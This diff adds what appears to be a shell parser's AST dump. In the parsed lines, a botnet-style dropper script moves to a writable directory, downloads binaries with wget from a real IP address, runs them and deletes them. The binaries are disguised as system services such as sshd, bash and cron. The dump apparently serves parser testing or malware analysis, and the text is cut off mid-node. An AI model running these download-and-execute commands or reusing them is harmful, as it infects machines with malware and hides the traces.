@@ -1,0 +1,611 @@
+ListNode(lineno=2, pos=(12, 147), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 99), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 99), word='http://45.76.60.22/DoPentpd'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(99, 100)),
+  CommandNode(lineno=2, pos=(101, 118), parts=[
+    WordNode(lineno=2, pos=(101, 106), word='chmod'),
+    WordNode(lineno=2, pos=(107, 109), word='+x'),
+    WordNode(lineno=2, pos=(110, 118), word='DoPentpd'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(118, 119)),
+  CommandNode(lineno=2, pos=(120, 130), parts=[
+    WordNode(lineno=2, pos=(120, 130), word='./DoPentpd'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(130, 131)),
+  CommandNode(lineno=2, pos=(132, 147), parts=[
+    WordNode(lineno=2, pos=(132, 134), word='rm'),
+    WordNode(lineno=2, pos=(135, 138), word='-rf'),
+    WordNode(lineno=2, pos=(139, 147), word='DoPentpd'),
+  ]),
+])
+ListNode(lineno=3, pos=(148, 283), parts=[
+  CommandNode(lineno=3, pos=(148, 155), parts=[
+    WordNode(lineno=3, pos=(148, 150), word='cd'),
+    WordNode(lineno=3, pos=(151, 155), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(156, 158)),
+  CommandNode(lineno=3, pos=(159, 170), parts=[
+    WordNode(lineno=3, pos=(159, 161), word='cd'),
+    WordNode(lineno=3, pos=(162, 170), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(171, 173)),
+  CommandNode(lineno=3, pos=(174, 181), parts=[
+    WordNode(lineno=3, pos=(174, 176), word='cd'),
+    WordNode(lineno=3, pos=(177, 181), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(182, 184)),
+  CommandNode(lineno=3, pos=(185, 193), parts=[
+    WordNode(lineno=3, pos=(185, 187), word='cd'),
+    WordNode(lineno=3, pos=(188, 193), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(194, 196)),
+  CommandNode(lineno=3, pos=(197, 201), parts=[
+    WordNode(lineno=3, pos=(197, 199), word='cd'),
+    WordNode(lineno=3, pos=(200, 201), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(201, 202)),
+  CommandNode(lineno=3, pos=(203, 235), parts=[
+    WordNode(lineno=3, pos=(203, 207), word='wget'),
+    WordNode(lineno=3, pos=(208, 235), word='http://45.76.60.22/DoPesshd'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(235, 236)),
+  CommandNode(lineno=3, pos=(237, 254), parts=[
+    WordNode(lineno=3, pos=(237, 242), word='chmod'),
+    WordNode(lineno=3, pos=(243, 245), word='+x'),
+    WordNode(lineno=3, pos=(246, 254), word='DoPesshd'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(254, 255)),
+  CommandNode(lineno=3, pos=(256, 266), parts=[
+    WordNode(lineno=3, pos=(256, 266), word='./DoPesshd'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(266, 267)),
+  CommandNode(lineno=3, pos=(268, 283), parts=[
+    WordNode(lineno=3, pos=(268, 270), word='rm'),
+    WordNode(lineno=3, pos=(271, 274), word='-rf'),
+    WordNode(lineno=3, pos=(275, 283), word='DoPesshd'),
+  ]),
+])
+ListNode(lineno=4, pos=(284, 431), parts=[
+  CommandNode(lineno=4, pos=(284, 291), parts=[
+    WordNode(lineno=4, pos=(284, 286), word='cd'),
+    WordNode(lineno=4, pos=(287, 291), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(292, 294)),
+  CommandNode(lineno=4, pos=(295, 306), parts=[
+    WordNode(lineno=4, pos=(295, 297), word='cd'),
+    WordNode(lineno=4, pos=(298, 306), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(307, 309)),
+  CommandNode(lineno=4, pos=(310, 317), parts=[
+    WordNode(lineno=4, pos=(310, 312), word='cd'),
+    WordNode(lineno=4, pos=(313, 317), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(318, 320)),
+  CommandNode(lineno=4, pos=(321, 329), parts=[
+    WordNode(lineno=4, pos=(321, 323), word='cd'),
+    WordNode(lineno=4, pos=(324, 329), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(330, 332)),
+  CommandNode(lineno=4, pos=(333, 337), parts=[
+    WordNode(lineno=4, pos=(333, 335), word='cd'),
+    WordNode(lineno=4, pos=(336, 337), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(337, 338)),
+  CommandNode(lineno=4, pos=(339, 374), parts=[
+    WordNode(lineno=4, pos=(339, 343), word='wget'),
+    WordNode(lineno=4, pos=(344, 374), word='http://45.76.60.22/DoPeopenssh'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(374, 375)),
+  CommandNode(lineno=4, pos=(376, 396), parts=[
+    WordNode(lineno=4, pos=(376, 381), word='chmod'),
+    WordNode(lineno=4, pos=(382, 384), word='+x'),
+    WordNode(lineno=4, pos=(385, 396), word='DoPeopenssh'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(396, 397)),
+  CommandNode(lineno=4, pos=(398, 411), parts=[
+    WordNode(lineno=4, pos=(398, 411), word='./DoPeopenssh'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(411, 412)),
+  CommandNode(lineno=4, pos=(413, 431), parts=[
+    WordNode(lineno=4, pos=(413, 415), word='rm'),
+    WordNode(lineno=4, pos=(416, 419), word='-rf'),
+    WordNode(lineno=4, pos=(420, 431), word='DoPeopenssh'),
+  ]),
+])
+ListNode(lineno=5, pos=(432, 567), parts=[
+  CommandNode(lineno=5, pos=(432, 439), parts=[
+    WordNode(lineno=5, pos=(432, 434), word='cd'),
+    WordNode(lineno=5, pos=(435, 439), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(440, 442)),
+  CommandNode(lineno=5, pos=(443, 454), parts=[
+    WordNode(lineno=5, pos=(443, 445), word='cd'),
+    WordNode(lineno=5, pos=(446, 454), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(455, 457)),
+  CommandNode(lineno=5, pos=(458, 465), parts=[
+    WordNode(lineno=5, pos=(458, 460), word='cd'),
+    WordNode(lineno=5, pos=(461, 465), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(466, 468)),
+  CommandNode(lineno=5, pos=(469, 477), parts=[
+    WordNode(lineno=5, pos=(469, 471), word='cd'),
+    WordNode(lineno=5, pos=(472, 477), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(478, 480)),
+  CommandNode(lineno=5, pos=(481, 485), parts=[
+    WordNode(lineno=5, pos=(481, 483), word='cd'),
+    WordNode(lineno=5, pos=(484, 485), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(485, 486)),
+  CommandNode(lineno=5, pos=(487, 519), parts=[
+    WordNode(lineno=5, pos=(487, 491), word='wget'),
+    WordNode(lineno=5, pos=(492, 519), word='http://45.76.60.22/DoPebash'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(519, 520)),
+  CommandNode(lineno=5, pos=(521, 538), parts=[
+    WordNode(lineno=5, pos=(521, 526), word='chmod'),
+    WordNode(lineno=5, pos=(527, 529), word='+x'),
+    WordNode(lineno=5, pos=(530, 538), word='DoPebash'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(538, 539)),
+  CommandNode(lineno=5, pos=(540, 550), parts=[
+    WordNode(lineno=5, pos=(540, 550), word='./DoPebash'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(550, 551)),
+  CommandNode(lineno=5, pos=(552, 567), parts=[
+    WordNode(lineno=5, pos=(552, 554), word='rm'),
+    WordNode(lineno=5, pos=(555, 558), word='-rf'),
+    WordNode(lineno=5, pos=(559, 567), word='DoPebash'),
+  ]),
+])
+ListNode(lineno=6, pos=(568, 703), parts=[
+  CommandNode(lineno=6, pos=(568, 575), parts=[
+    WordNode(lineno=6, pos=(568, 570), word='cd'),
+    WordNode(lineno=6, pos=(571, 575), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(576, 578)),
+  CommandNode(lineno=6, pos=(579, 590), parts=[
+    WordNode(lineno=6, pos=(579, 581), word='cd'),
+    WordNode(lineno=6, pos=(582, 590), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(591, 593)),
+  CommandNode(lineno=6, pos=(594, 601), parts=[
+    WordNode(lineno=6, pos=(594, 596), word='cd'),
+    WordNode(lineno=6, pos=(597, 601), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(602, 604)),
+  CommandNode(lineno=6, pos=(605, 613), parts=[
+    WordNode(lineno=6, pos=(605, 607), word='cd'),
+    WordNode(lineno=6, pos=(608, 613), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(614, 616)),
+  CommandNode(lineno=6, pos=(617, 621), parts=[
+    WordNode(lineno=6, pos=(617, 619), word='cd'),
+    WordNode(lineno=6, pos=(620, 621), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(621, 622)),
+  CommandNode(lineno=6, pos=(623, 655), parts=[
+    WordNode(lineno=6, pos=(623, 627), word='wget'),
+    WordNode(lineno=6, pos=(628, 655), word='http://45.76.60.22/DoPetftp'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(655, 656)),
+  CommandNode(lineno=6, pos=(657, 674), parts=[
+    WordNode(lineno=6, pos=(657, 662), word='chmod'),
+    WordNode(lineno=6, pos=(663, 665), word='+x'),
+    WordNode(lineno=6, pos=(666, 674), word='DoPetftp'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(674, 675)),
+  CommandNode(lineno=6, pos=(676, 686), parts=[
+    WordNode(lineno=6, pos=(676, 686), word='./DoPetftp'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(686, 687)),
+  CommandNode(lineno=6, pos=(688, 703), parts=[
+    WordNode(lineno=6, pos=(688, 690), word='rm'),
+    WordNode(lineno=6, pos=(691, 694), word='-rf'),
+    WordNode(lineno=6, pos=(695, 703), word='DoPetftp'),
+  ]),
+])
+ListNode(lineno=7, pos=(704, 839), parts=[
+  CommandNode(lineno=7, pos=(704, 711), parts=[
+    WordNode(lineno=7, pos=(704, 706), word='cd'),
+    WordNode(lineno=7, pos=(707, 711), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(712, 714)),
+  CommandNode(lineno=7, pos=(715, 726), parts=[
+    WordNode(lineno=7, pos=(715, 717), word='cd'),
+    WordNode(lineno=7, pos=(718, 726), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(727, 729)),
+  CommandNode(lineno=7, pos=(730, 737), parts=[
+    WordNode(lineno=7, pos=(730, 732), word='cd'),
+    WordNode(lineno=7, pos=(733, 737), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(738, 740)),
+  CommandNode(lineno=7, pos=(741, 749), parts=[
+    WordNode(lineno=7, pos=(741, 743), word='cd'),
+    WordNode(lineno=7, pos=(744, 749), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(750, 752)),
+  CommandNode(lineno=7, pos=(753, 757), parts=[
+    WordNode(lineno=7, pos=(753, 755), word='cd'),
+    WordNode(lineno=7, pos=(756, 757), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(757, 758)),
+  CommandNode(lineno=7, pos=(759, 791), parts=[
+    WordNode(lineno=7, pos=(759, 763), word='wget'),
+    WordNode(lineno=7, pos=(764, 791), word='http://45.76.60.22/DoPewget'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(791, 792)),
+  CommandNode(lineno=7, pos=(793, 810), parts=[
+    WordNode(lineno=7, pos=(793, 798), word='chmod'),
+    WordNode(lineno=7, pos=(799, 801), word='+x'),
+    WordNode(lineno=7, pos=(802, 810), word='DoPewget'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(810, 811)),
+  CommandNode(lineno=7, pos=(812, 822), parts=[
+    WordNode(lineno=7, pos=(812, 822), word='./DoPewget'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(822, 823)),
+  CommandNode(lineno=7, pos=(824, 839), parts=[
+    WordNode(lineno=7, pos=(824, 826), word='rm'),
+    WordNode(lineno=7, pos=(827, 830), word='-rf'),
+    WordNode(lineno=7, pos=(831, 839), word='DoPewget'),
+  ]),
+])
+ListNode(lineno=8, pos=(840, 975), parts=[
+  CommandNode(lineno=8, pos=(840, 847), parts=[
+    WordNode(lineno=8, pos=(840, 842), word='cd'),
+    WordNode(lineno=8, pos=(843, 847), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(848, 850)),
+  CommandNode(lineno=8, pos=(851, 862), parts=[
+    WordNode(lineno=8, pos=(851, 853), word='cd'),
+    WordNode(lineno=8, pos=(854, 862), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(863, 865)),
+  CommandNode(lineno=8, pos=(866, 873), parts=[
+    WordNode(lineno=8, pos=(866, 868), word='cd'),
+    WordNode(lineno=8, pos=(869, 873), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(874, 876)),
+  CommandNode(lineno=8, pos=(877, 885), parts=[
+    WordNode(lineno=8, pos=(877, 879), word='cd'),
+    WordNode(lineno=8, pos=(880, 885), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(886, 888)),
+  CommandNode(lineno=8, pos=(889, 893), parts=[
+    WordNode(lineno=8, pos=(889, 891), word='cd'),
+    WordNode(lineno=8, pos=(892, 893), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(893, 894)),
+  CommandNode(lineno=8, pos=(895, 927), parts=[
+    WordNode(lineno=8, pos=(895, 899), word='wget'),
+    WordNode(lineno=8, pos=(900, 927), word='http://45.76.60.22/DoPecron'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(927, 928)),
+  CommandNode(lineno=8, pos=(929, 946), parts=[
+    WordNode(lineno=8, pos=(929, 934), word='chmod'),
+    WordNode(lineno=8, pos=(935, 937), word='+x'),
+    WordNode(lineno=8, pos=(938, 946), word='DoPecron'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(946, 947)),
+  CommandNode(lineno=8, pos=(948, 958), parts=[
+    WordNode(lineno=8, pos=(948, 958), word='./DoPecron'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(958, 959)),
+  CommandNode(lineno=8, pos=(960, 975), parts=[
+    WordNode(lineno=8, pos=(960, 962), word='rm'),
+    WordNode(lineno=8, pos=(963, 966), word='-rf'),
+    WordNode(lineno=8, pos=(967, 975), word='DoPecron'),
+  ]),
+])
+ListNode(lineno=9, pos=(976, 1107), parts=[
+  CommandNode(lineno=9, pos=(976, 983), parts=[
+    WordNode(lineno=9, pos=(976, 978), word='cd'),
+    WordNode(lineno=9, pos=(979, 983), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(984, 986)),
+  CommandNode(lineno=9, pos=(987, 998), parts=[
+    WordNode(lineno=9, pos=(987, 989), word='cd'),
+    WordNode(lineno=9, pos=(990, 998), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(999, 1001)),
+  CommandNode(lineno=9, pos=(1002, 1009), parts=[
+    WordNode(lineno=9, pos=(1002, 1004), word='cd'),
+    WordNode(lineno=9, pos=(1005, 1009), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1010, 1012)),
+  CommandNode(lineno=9, pos=(1013, 1021), parts=[
+    WordNode(lineno=9, pos=(1013, 1015), word='cd'),
+    WordNode(lineno=9, pos=(1016, 1021), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1022, 1024)),
+  CommandNode(lineno=9, pos=(1025, 1029), parts=[
+    WordNode(lineno=9, pos=(1025, 1027), word='cd'),
+    WordNode(lineno=9, pos=(1028, 1029), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1029, 1030)),
+  CommandNode(lineno=9, pos=(1031, 1062), parts=[
+    WordNode(lineno=9, pos=(1031, 1035), word='wget'),
+    WordNode(lineno=9, pos=(1036, 1062), word='http://45.76.60.22/DoPeftp'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1062, 1063)),
+  CommandNode(lineno=9, pos=(1064, 1080), parts=[
+    WordNode(lineno=9, pos=(1064, 1069), word='chmod'),
+    WordNode(lineno=9, pos=(1070, 1072), word='+x'),
+    WordNode(lineno=9, pos=(1073, 1080), word='DoPeftp'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1080, 1081)),
+  CommandNode(lineno=9, pos=(1082, 1091), parts=[
+    WordNode(lineno=9, pos=(1082, 1091), word='./DoPeftp'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1091, 1092)),
+  CommandNode(lineno=9, pos=(1093, 1107), parts=[
+    WordNode(lineno=9, pos=(1093, 1095), word='rm'),
+    WordNode(lineno=9, pos=(1096, 1099), word='-rf'),
+    WordNode(lineno=9, pos=(1100, 1107), word='DoPeftp'),
+  ]),
+])
+ListNode(lineno=10, pos=(1108, 1243), parts=[
+  CommandNode(lineno=10, pos=(1108, 1115), parts=[
+    WordNode(lineno=10, pos=(1108, 1110), word='cd'),
+    WordNode(lineno=10, pos=(1111, 1115), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1116, 1118)),
+  CommandNode(lineno=10, pos=(1119, 1130), parts=[
+    WordNode(lineno=10, pos=(1119, 1121), word='cd'),
+    WordNode(lineno=10, pos=(1122, 1130), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1131, 1133)),
+  CommandNode(lineno=10, pos=(1134, 1141), parts=[
+    WordNode(lineno=10, pos=(1134, 1136), word='cd'),
+    WordNode(lineno=10, pos=(1137, 1141), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1142, 1144)),
+  CommandNode(lineno=10, pos=(1145, 1153), parts=[
+    WordNode(lineno=10, pos=(1145, 1147), word='cd'),
+    WordNode(lineno=10, pos=(1148, 1153), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1154, 1156)),
+  CommandNode(lineno=10, pos=(1157, 1161), parts=[
+    WordNode(lineno=10, pos=(1157, 1159), word='cd'),
+    WordNode(lineno=10, pos=(1160, 1161), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1161, 1162)),
+  CommandNode(lineno=10, pos=(1163, 1195), parts=[
+    WordNode(lineno=10, pos=(1163, 1167), word='wget'),
+    WordNode(lineno=10, pos=(1168, 1195), word='http://45.76.60.22/DoPepftp'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1195, 1196)),
+  CommandNode(lineno=10, pos=(1197, 1214), parts=[
+    WordNode(lineno=10, pos=(1197, 1202), word='chmod'),
+    WordNode(lineno=10, pos=(1203, 1205), word='+x'),
+    WordNode(lineno=10, pos=(1206, 1214), word='DoPepftp'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1214, 1215)),
+  CommandNode(lineno=10, pos=(1216, 1226), parts=[
+    WordNode(lineno=10, pos=(1216, 1226), word='./DoPepftp'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1226, 1227)),
+  CommandNode(lineno=10, pos=(1228, 1243), parts=[
+    WordNode(lineno=10, pos=(1228, 1230), word='rm'),
+    WordNode(lineno=10, pos=(1231, 1234), word='-rf'),
+    WordNode(lineno=10, pos=(1235, 1243), word='DoPepftp'),
+  ]),
+])
+ListNode(lineno=11, pos=(1244, 1371), parts=[
+  CommandNode(lineno=11, pos=(1244, 1251), parts=[
+    WordNode(lineno=11, pos=(1244, 1246), word='cd'),
+    WordNode(lineno=11, pos=(1247, 1251), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1252, 1254)),
+  CommandNode(lineno=11, pos=(1255, 1266), parts=[
+    WordNode(lineno=11, pos=(1255, 1257), word='cd'),
+    WordNode(lineno=11, pos=(1258, 1266), word='/var/run'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1267, 1269)),
+  CommandNode(lineno=11, pos=(1270, 1277), parts=[
+    WordNode(lineno=11, pos=(1270, 1272), word='cd'),
+    WordNode(lineno=11, pos=(1273, 1277), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1278, 1280)),
+  CommandNode(lineno=11, pos=(1281, 1289), parts=[
+    WordNode(lineno=11, pos=(1281, 1283), word='cd'),
+    WordNode(lineno=11, pos=(1284, 1289), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1290, 1292)),
+  CommandNode(lineno=11, pos=(1293, 1297), parts=[
+    WordNode(lineno=11, pos=(1293, 1295), word='cd'),
+    WordNode(lineno=11, pos=(1296, 1297), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1297, 1298)),
+  CommandNode(lineno=11, pos=(1299, 1329), parts=[
+    WordNode(lineno=11, pos=(1299, 1303), word='wget'),
+    WordNode(lineno=11, pos=(1304, 1329), word='http://45.76.60.22/DoPesh'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1329, 1330)),
+  CommandNode(lineno=11, pos=(1331, 1346), parts=[
+    WordNode(lineno=11, pos=(1331, 1336), word='chmod'),
+    WordNode(lineno=11, pos=(1337, 1339), word='+x'),
+    WordNode(lineno=11, pos=(1340, 1346), word='DoPesh'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1346, 1347)),
+  CommandNode(lineno=11, pos=(1348, 1356), parts=[
+    WordNode(lineno=11, pos=(1348, 1356), word='./DoPesh'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1356, 1357)),
+  CommandNode(lineno=11, pos=(1358, 1371), parts=[
+    WordNode(lineno=11, pos=(1358, 1360), word='rm'),
+    WordNode(lineno=11, pos=(1361, 1364), word='-rf'),
+    WordNode(lineno=11, pos=(1365, 1371), word='DoPesh'),
+  ]),
+])
+ListNode(lineno=12, pos=(1372, 1507), parts=[
+  CommandNode(lineno=12, pos=(1372, 1379), parts=[
+    WordNode(lineno=12, pos=(1372, 1374), word='cd'),
+    WordNode(lineno=12, pos=(1375, 1379), word='/tmp'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1380, 1382)),
+  CommandNode(lineno=12, pos=(1383, 1394), parts=[
+    WordNode(lineno=12, pos=(1383, 1385), word='cd'),
+    WordNode(lineno=12, pos=(1386, 1394), word='/var/run'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1395, 1397)),
+  CommandNode(lineno=12, pos=(1398, 1405), parts=[
+    WordNode(lineno=12, pos=(1398, 1400), word='cd'),
+    WordNode(lineno=12, pos=(1401, 1405), word='/mnt'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1406, 1408)),
+  CommandNode(lineno=12, pos=(1409, 1417), parts=[
+    WordNode(lineno=12, pos=(1409, 1411), word='cd'),
+    WordNode(lineno=12, pos=(1412, 1417), word='/root'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1418, 1420)),
+  CommandNode(lineno=12, pos=(1421, 1425), parts=[
+    WordNode(lineno=12, pos=(1421, 1423), word='cd'),
+    WordNode(lineno=12, pos=(1424, 1425), word='/'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1425, 1426)),
+  CommandNode(lineno=12, pos=(1427, 1459), parts=[
+    WordNode(lineno=12, pos=(1427, 1431), word='wget'),
+    WordNode(lineno=12, pos=(1432, 1459), word='http://45.76.60.22/DoPeshit'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1459, 1460)),
+  CommandNode(lineno=12, pos=(1461, 1478), parts=[
+    WordNode(lineno=12, pos=(1461, 1466), word='chmod'),
+    WordNode(lineno=12, pos=(1467, 1469), word='+x'),
+    WordNode(lineno=12, pos=(1470, 1478), word='DoPeshit'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1478, 1479)),
+  CommandNode(lineno=12, pos=(1480, 1490), parts=[
+    WordNode(lineno=12, pos=(1480, 1490), word='./DoPeshit'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1490, 1491)),
+  CommandNode(lineno=12, pos=(1492, 1507), parts=[
+    WordNode(lineno=12, pos=(1492, 1494), word='rm'),
+    WordNode(lineno=12, pos=(1495, 1498), word='-rf'),
+    WordNode(lineno=12, pos=(1499, 1507), word='DoPeshit'),
+  ]),
+])
+ListNode(lineno=13, pos=(1508, 1655), parts=[
+  CommandNode(lineno=13, pos=(1508, 1515), parts=[
+    WordNode(lineno=13, pos=(1508, 1510), word='cd'),
+    WordNode(lineno=13, pos=(1511, 1515), word='/tmp'),
+  ]),
+  OperatorNode(lineno=13, op='||', pos=(1516, 1518)),
+  CommandNode(lineno=13, pos=(1519, 1530), parts=[
+    WordNode(lineno=13, pos=(1519, 1521), word='cd'),
+    WordNode(lineno=13, pos=(1522, 1530), word='/var/run'),
+  ]),
+  OperatorNode(lineno=13, op='||', pos=(1531, 1533)),
+  CommandNode(lineno=13, pos=(1534, 1541), parts=[
+    WordNode(lineno=13, pos=(1534, 1536), word='cd'),
+    WordNode(lineno=13, pos=(1537, 1541), word='/mnt'),
+  ]),
+  OperatorNode(lineno=13, op='||', pos=(1542, 1544)),
+  CommandNode(lineno=13, pos=(1545, 1553), parts=[
+    WordNode(lineno=13, pos=(1545, 1547), word='cd'),
+    WordNode(lineno=13, pos=(1548, 1553), word='/root'),
+  ]),
+  OperatorNode(lineno=13, op='||', pos=(1554, 1556)),
+  CommandNode(lineno=13, pos=(1557, 1561), parts=[
+    WordNode(lineno=13, pos=(1557, 1559), word='cd'),
+    WordNode(lineno=13, pos=(1560, 1561), word='/'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1561, 1562)),
+  CommandNode(lineno=13, pos=(1563, 1598), parts=[
+    WordNode(lineno=13, pos=(1563, 1567), word='wget'),
+    WordNode(lineno=13, pos=(1568, 1598), word='http://45.76.60.22/DoPeapache2'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1598, 1599)),
+  CommandNode(lineno=13, pos=(1600, 1620), parts=[
+    WordNode(lineno=13, pos=(1600, 1605), word='chmod'),
+    WordNode(lineno=13, pos=(1606, 1608), word='+x'),
+    WordNode(lineno=13, pos=(1609, 1620), word='DoPeapache2'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1620, 1621)),
+  CommandNode(lineno=13, pos=(1622, 1635), parts=[
+    WordNode(lineno=13, pos=(1622, 1635), word='./DoPeapache2'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1635, 1636)),
+  CommandNode(lineno=13, pos=(1637, 1655), parts=[
+    WordNode(lineno=13, pos=(1637, 1639), word='rm'),
+    WordNode(lineno=13, pos=(1640, 1643), word='-rf'),
+    WordNode(lineno=13, pos=(1644, 1655), word='DoPeapache2'),
+  ]),
+])
+ListNode(lineno=14, pos=(1656, 1803), parts=[
+  CommandNode(lineno=14, pos=(1656, 1663), parts=[
+    WordNode(lineno=14, pos=(1656, 1658), word='cd'),
+    WordNode(lineno=14, pos=(1659, 1663), word='/tmp'),
+  ]),
+  OperatorNode(lineno=14, op='||', pos=(1664, 1666)),
+  CommandNode(lineno=14, pos=(1667, 1678), parts=[
+    WordNode(lineno=14, pos=(1667, 1669), word='cd'),
+    WordNode(lineno=14, pos=(1670, 1678), word='/var/run'),
+  ]),
+  OperatorNode(lineno=14, op='||', pos=(1679, 1681)),
+  CommandNode(lineno=14, pos=(1682, 1689), parts=[
+    WordNode(lineno=14, pos=(1682, 1684), word='cd'),
+    WordNode(lineno=14, pos=(1685, 1689), word='/mnt'),
+  ]),
+  OperatorNode(lineno=14, op='||', pos=(1690, 1692)),
+  CommandNode(lineno=14, pos=(1693, 1701), parts=[
+    WordNode(lineno=14, pos=(1693, 1695), word='cd'),
+    WordNode(lineno=14, pos=(1696, 1701), word='/root'),
+  ]),
+  OperatorNode(lineno=14, op='||', pos=(1702, 1704)),
+  CommandNode(lineno=14, pos=(1705, 1709), parts=[
+    WordNode(lineno=14, pos=(1705, 1707), word='cd'),
+    WordNode(lineno=14, pos=(1708, 1709), word='/'),
+  ]),
+  OperatorNode(lineno=14, op=';', pos=(1709, 1710)),
+  CommandNode(lineno=14, pos=(1711, 1746), parts=[
